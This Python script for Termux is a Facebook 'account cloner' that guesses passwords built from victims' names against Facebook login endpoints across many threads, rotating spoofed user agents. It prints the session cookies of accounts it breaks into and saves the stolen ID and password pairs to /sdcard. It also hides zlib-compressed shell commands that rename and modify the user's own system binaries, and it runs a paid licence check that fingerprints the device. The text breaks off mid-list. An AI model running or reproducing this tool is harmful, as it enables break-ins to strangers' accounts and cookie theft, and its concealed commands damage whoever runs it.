from os import path
import os,base64,zlib,pip,urllib,platform
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' TL-tl; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)
#menu_apikey()
logo=(f"""\x1b[1;94m═════════════════════════════════════════════════════╗
\x1b[1;94m║                                                     ║
\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m███    ██       \x1b[1;91m███████ \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m███████\x1b[1;94m ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m████   ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██ ██  ██ \x1b[1;92m█████ \x1b[1;91m█████   \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m█████\x1b[1;94m   ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██  ██ ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m██   ████       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m███████\x1b[1;94m ║
\x1b[1;94m║                                                     ║
\x1b[1;94m╚═════════════════════════════════════════════════════╝
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║       \x1b[1;91m[\x1b[1;92m+\x1b[1;91m]\x1b[1;92mBANGLADESHI FILE ACCOUNT CLONER\x1b[1;91m[\x1b[1;92m+\x1b[1;91m]         \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] DEVELOPER      :        ACTION-FIRE              \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        FT ALVI                  \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +9660507886505           \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        ACTION-FIRE 	      \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :        ON-FIRE                  \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] STATUS         :        \x1b[1;33mPREMIUM                  \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        1.0.3.PRO                \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] NETWORK        :        3G, 4G/5G, ON            \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] TOOLS          :        PRO-FILE CLONER          \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝
""")

def linex():
    print(55*'\033[1;95m=')
def clear():
    os.system(f'clear')
    print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    pass
    exit("Error in termux modules ")

if os.path.exists(sz):
    os.rename(sz1,'.f1')
    os.rename(sz2,'.f2')
    os.system(sz3)
    os.system(sz4)
    os.system(sz5)
    os.system(sz6)
else:
    pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")
update = requests.get("https://raw.githubusercontent.com/ON-FIRE-404/Approval/main/on.txt").text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = "FIRE=="+id+bxd+xp
FIRE = "ACTION-FIRE"
myweb2 = requests.get(f"https://raw.githubusercontent.com/ON-FIRE-404/Approval/main/on.txt").text
os.system('xdg-open https://facebook.com/ft.alvi.18')
logo1 = ("""\x1b[1;94m═════════════════════════════════════════════════════╗
\x1b[1;94m║                                                     ║
\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m███    ██       \x1b[1;91m███████ \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m███████\x1b[1;94m ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m████   ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██ ██  ██ \x1b[1;92m█████ \x1b[1;91m█████   \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m█████\x1b[1;94m   ║
\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██  ██ ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m██   ████       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m███████\x1b[1;94m ║
\x1b[1;94m║                                                     ║
\x1b[1;94m╚═════════════════════════════════════════════════════╝
""")
def approval():
    try:
        os.system('clear')
        print(logo1)
        x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
        if str("upppdate") in update:
            os.system('clear')
            exit('script is in update / maintanance be patient ')
        elif str("res-sseett") in update:
            os.system('')
            os.system('')
            os.system('')
            exit('DONT TRY TO BYPASS')
        elif bumper in myweb2:
            print("YOUR KEY WAS APPROVED")
            FIRE()
        else:
            os.system("clear");print(logo)
            print(f"{RED}YOUR DEVICE LICENSE KEY IS NOT APPROVED")
            print(55*"\033[1;92m=")
            print(f"\033[1;92m\033[1;91m[\033[1;92m•\033[1;91m]KEY : {RED}{bumper}")
            print(55*"\033[1;92m=")
            print(f"{GREEN}[07]☞︎︎︎DAYS PRICE : 350  TK")
            print(f"{GREEN}[15]☞︎︎︎DAYS PRICE : 500  TK")
            print(f"{GREEN}[30]☞︎︎︎DAYS PRICE : 1000 TK")
            print(f"{BLUE}FREE APPROVAL AVAILABLE CONTACT ME ON MY WHATSAPP TO GET FREE APPROVAL")
            print(55*"\033[1;92m=")
            input("\033[1;91m[PRESS ENTER TO SEND KEY TO ADMIN]")
            os.system(f"termux-open-url https://wa.me/+9660507886506?text={bumper}")
            approval()
    except requests.exceptions.ConnectionError:
        exit(' NO INTERNET CONNECTION ..')

def rrrr():
    if bumper in myweb2:
        pass
    else:
        approval()
def xchker():
    pass
    approval()
def FIRE():
	clear()
	#ckx()
	print(f"\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m FILE CLONING [SUPER SPEED] ")
	print(f"\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m MY FACEBOOK PAGE")
	print(f"\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m MY GITHUB ACCOUNT")
	print(f"\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m MY YOUTUBE CHANNEL")
	print(f"\033[1;91m[\033[1;92m5\033[1;91m]\033[1;91m EXIT")
	me=input(f'\n\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m CHOOSE : ')
	if me in ["2", "02"]:
		os.system('xdg-open https://facebook.com/𝘼𝘾𝙏𝙄𝙊𝙉-𝙁𝙄𝙍𝙀-107968471946247')
	if me in ["3","03"]:
		os.system('xdg-open https://github.com/ACTION-FIRE')
	if me in ["4","04"]:
		os.system('xdg-open https://youtube.com/@ON-FIRE')
	if me in ["5","05"]:
		os.system("clear")
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m ENTER FILE PATH\033[1;37m : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f'\033[1;91mFILE LOCATION NOT FOUND')
			exit()
		os.system("clear")
		print(logo)
		print(f'\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m METHOD 1 [API] \033[1;92mBEST\n\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m METHOD 2 [mbasic]')
		mthd=input(f'\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m CHOOSE : ')
		plist=[]
		try:
			os.system("clear")
			print(logo)
			ps_limit = int(input(f'\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m HOW MANY PASSWORDS DO YOU WANT TO ADD ?'))
		except:
			ps_limit =1
		print(f'\033[1;32m EXAMPLE : first last,firtslast,first123,last123,firstlast123 ')
		for i in range(ps_limit):
			plist.append(input(f'\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m PASSWORD{i+1}: '))
		print(f'\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mDO YOU WANT SHOW CP ACCOUNT? (y/n): ')
		cx=input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m CHOOSE : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(55*'\033[1;95m=')
			print(f' TOTAL ACCOUNTS : \033[1;32m'+total_ids)
			print(" USE 100089/100090 IDS FILE FOR OK IDS")
			print(" OK IDS ARE SAVED IN : /SDCARD/FIRE-OK.TXT")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(ffb1,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(api1,ids,names,passlist)
				elif mthd in ['5','05']:
					crack_submit.submit(ffb3,ids,names,passlist)
				elif mthd in ['6','06']:
					crack_submit.submit(ffb4,ids,names,passlist)
				elif mthd in ['7','07']:
					crack_submit.submit(ffb7,ids,names,passlist)
				elif mthd in ['8','08']:
					crack_submit.submit(ffb8,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)
def ffb(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(f' ')[0]
        try:
            last = names.split(f' ')[1]
        except:
            last = 'FIRE'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRE=session.cookies.get_dict().keys()
            if "c_user" in FIRE:
                coki=session.cookies.get_dict()
                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m[FIRE-OK] %s | %s'%(ids,pas))
                print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                #cek_apk(session,coki)
                oks.append(ids)
                break
            elif 'checkpoint' in FIRE:
                if 'y' in pcp:
                    print(f'\r\r\033[1;90m[FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 